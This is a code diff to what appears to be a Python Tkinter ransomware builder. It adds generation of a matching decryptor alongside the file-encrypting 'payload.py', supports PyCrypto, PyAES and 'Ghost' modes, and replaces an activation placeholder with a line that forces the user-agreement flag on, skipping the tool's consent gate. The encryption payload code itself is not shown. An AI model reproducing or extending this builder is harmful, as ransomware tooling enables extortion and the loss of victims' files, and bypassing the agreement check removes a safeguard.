@@ -60,6 +60,7 @@ else:
 
 
 from src.create_demon import *
+from src.create_decrypt import *
 
 try:
     from Crypto import Random
@@ -179,7 +180,7 @@ class MainWindow(Tk):
         }
 
 
-        #<activate>
+        self.options['agreed'].set(1)
         #<activate>
 
         if not self.options['agreed'].get() == 1:
@@ -736,11 +737,19 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                 self.options['target_dirs'].get(),
                 self.options['remove_payload'].get(),
                 self.options['working_dir'].get())
-            messagebox.showinfo('SUCCESS', 'Payload successfully generated!\n\nFile saved to ./payload.py')
-            self.gen.destroy()
         except Exception as e:
             messagebox.showwarning('ERROR', 'Failed to generate payload!\n\n%s' % e)
 
+        try:
+            create_decrypt(self.options['type'].get())
+
+            messagebox.showinfo('SUCCESS', 'Payload and decryptor were successfully generated!\n\nFiles saved to:\n./payload.py\n./decryptor.py')
+        except Exception as e:
+            messagebox.showwarning('ERROR', 'Failed to generate decryptor!\n\n%s' % e)
+
+
+
+        self.gen.destroy()
     def decrypt_files(self):
         ask = confirm(text='What type of encryption are we dealing with?', buttons=['PyCrypto', 'PyAES', 'Ghost', "I don't know"])
         if ask == "I don't know":
@@ -759,7 +768,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         if p == False:
             return
 
-        a = messagebox.askokcancel('WARNING', 'This tool will decrypt your files with the given key.\n\nHowever, if your key or method is not correct, your files will return corrupted.\n\n You might want to make a backup!')
+        a = messagebox.askokcancel('WARNING', 'This tool will decrypt your files with the given key.\n\nHowever, if your key or method is not correct, your (encrypted) files will return corrupted.\n\n You might want to make a backup!')
         if a == True:
             pass
         else:
@@ -774,12 +783,10 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                             decrypt_file(os.path.join(path, name), key)
                             print("[Decrypted] %s" % name)
                             counter+=1
-                            os.remove(os.path.join(path, name))
                         elif ask == 'PyAES':
                             print("[Decrypting] %s" % name)
                             decrypt_file_pyaes(os.path.join(path, name), key)
                             counter+=1
-                            os.remove(os.path.join(path, name))
                         elif ask == 'Ghost':
                             rename_file(os.path.join(path, name))
                             print("[RENAMED] %s" % name)
